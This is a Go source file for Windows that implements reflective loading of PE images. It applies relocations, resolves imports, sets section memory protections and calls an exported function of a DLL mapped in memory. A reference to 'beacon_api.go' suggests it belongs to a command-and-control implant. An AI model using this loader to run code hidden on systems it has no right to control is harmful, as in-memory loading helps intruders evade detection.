//go:build windows

package commands

import (
	"fmt"
	"syscall"
	"unsafe"
)

func rlProcessRelocations(baseAddr uintptr, relocRVA, relocSize uintptr, delta int64) (int, error) {
	count := 0
	offset := uintptr(0)

	for offset < relocSize {
		block := (*rlBaseRelocation)(unsafe.Pointer(baseAddr + relocRVA + offset))
		if block.VirtualAddress == 0 || block.SizeOfBlock == 0 {
			break
		}

		numEntries := (block.SizeOfBlock - 8) / 2
		entriesPtr := baseAddr + relocRVA + offset + 8

		for i := uint32(0); i < numEntries; i++ {
			entry := *(*uint16)(unsafe.Pointer(entriesPtr + uintptr(i)*2))
			relocType := entry >> 12
			relocOffset := entry & 0xFFF

			switch relocType {
			case rlRelBasedAbsolute:
				// Padding, skip
			case rlRelBasedDir64:
				patchAddr := baseAddr + uintptr(block.VirtualAddress) + uintptr(relocOffset)
				val := *(*int64)(unsafe.Pointer(patchAddr))
				*(*int64)(unsafe.Pointer(patchAddr)) = val + delta
				count++
			default:
				return count, fmt.Errorf("unsupported relocation type %d", relocType)
			}
		}

		offset += uintptr(block.SizeOfBlock)
	}

	return count, nil
}

func rlResolveImports(baseAddr uintptr, importRVA uintptr) (int, error) {
	dllCount := 0
	descSize := unsafe.Sizeof(rlImportDescriptor{})

	for i := uintptr(0); ; i++ {
		desc := (*rlImportDescriptor)(unsafe.Pointer(baseAddr + importRVA + i*descSize))
		if desc.Name == 0 {
			break
		}

		// Read DLL name (null-terminated ASCII at RVA) — reuses readCString from beacon_api.go
		dllName := readCString(baseAddr + uintptr(desc.Name))

		// Load the DLL
		dllNameBytes := append([]byte(dllName), 0)
		hModule, _, err := procLoadLibraryARL.Call(uintptr(unsafe.Pointer(&dllNameBytes[0])))
		if hModule == 0 {
			return dllCount, fmt.Errorf("failed to load module %s: %v", dllName, err)
		}
		dllCount++

		// Walk import address table (IAT) and import name table (INT)
		thunkRVA := desc.OriginalFirstThunk
		if thunkRVA == 0 {
			thunkRVA = desc.FirstThunk // No INT, use IAT
		}
		iatRVA := desc.FirstThunk

		for j := uintptr(0); ; j++ {
			thunkPtr := baseAddr + uintptr(thunkRVA) + j*8
			iatPtr := baseAddr + uintptr(iatRVA) + j*8

			thunkVal := *(*uint64)(unsafe.Pointer(thunkPtr))
			if thunkVal == 0 {
				break
			}

			var funcAddr uintptr
			if thunkVal&0x8000000000000000 != 0 {
				// Import by ordinal
				ordinal := uint16(thunkVal & 0xFFFF)
				funcAddr, _, err = procGetProcAddressRL.Call(hModule, uintptr(ordinal))
			} else {
				// Import by name — IMAGE_IMPORT_BY_NAME: 2-byte Hint + name
				nameRVA := uint32(thunkVal)
				funcName := readCString(baseAddr + uintptr(nameRVA) + 2) // skip hint
				funcNameBytes := append([]byte(funcName), 0)
				funcAddr, _, err = procGetProcAddressRL.Call(hModule, uintptr(unsafe.Pointer(&funcNameBytes[0])))
			}

			if funcAddr == 0 {
				return dllCount, fmt.Errorf("failed to resolve import in %s: %v", dllName, err)
			}

			// Write resolved address into IAT
			*(*uintptr)(unsafe.Pointer(iatPtr)) = funcAddr
		}
	}

	return dllCount, nil
}

func rlCallExport(baseAddr uintptr, peData []byte, ntOffset int, funcName string) (uintptr, error) {
	optHeaderOff := ntOffset + 4 + int(unsafe.Sizeof(imageFileHeader{}))
	optHeader := (*rlOptionalHeader64)(unsafe.Pointer(&peData[optHeaderOff]))

	// Export directory is index 0
	exportDir := optHeader.DataDirectory[0]
	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
		return 0, fmt.Errorf("no export directory in PE")
	}

	type rlExportDirectory struct {
		Characteristics       uint32
		TimeDateStamp         uint32
		MajorVersion          uint16
		MinorVersion          uint16
		Name                  uint32
		Base                  uint32
		NumberOfFunctions     uint32
		NumberOfNames         uint32
		AddressOfFunctions    uint32
		AddressOfNames        uint32
		AddressOfNameOrdinals uint32
	}

	expDir := (*rlExportDirectory)(unsafe.Pointer(baseAddr + uintptr(exportDir.VirtualAddress)))

	for i := uint32(0); i < expDir.NumberOfNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(baseAddr + uintptr(expDir.AddressOfNames) + uintptr(i)*4))
		name := readCString(baseAddr + uintptr(nameRVA))

		if name == funcName {
			ordinal := *(*uint16)(unsafe.Pointer(baseAddr + uintptr(expDir.AddressOfNameOrdinals) + uintptr(i)*2))
			funcRVA := *(*uint32)(unsafe.Pointer(baseAddr + uintptr(expDir.AddressOfFunctions) + uintptr(ordinal)*4))
			funcAddr := baseAddr + uintptr(funcRVA)

			ret, _, _ := syscall.SyscallN(funcAddr)
			return ret, nil
		}
	}

	return 0, fmt.Errorf("export '%s' not found", funcName)
}

func rlSectionProtection(characteristics uint32) uint32 {
	isExec := (characteristics & rlSCNMemExecute) != 0
	isRead := (characteristics & rlSCNMemRead) != 0
	isWrite := (characteristics & rlSCNMemWrite) != 0

	switch {
	case isExec && isRead && isWrite:
		return rlPageExecuteRW
	case isExec && isRead:
		return rlPageExecuteRead
	case isExec:
		return rlPageExecuteRead
	case isRead && isWrite:
		return rlPageReadWrite
	case isRead:
		return rlPageReadOnly
	default:
		return rlPageNoAccess
	}
}

func rlZeroMemory(addr uintptr, size uintptr) {
	mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
	for i := range mem {
		mem[i] = 0
	}
}

func rlSectionName(name [8]byte) string {
	n := 0
	for i, b := range name {
		if b == 0 {
			break
		}
		n = i + 1
	}
	return string(name[:n])
}
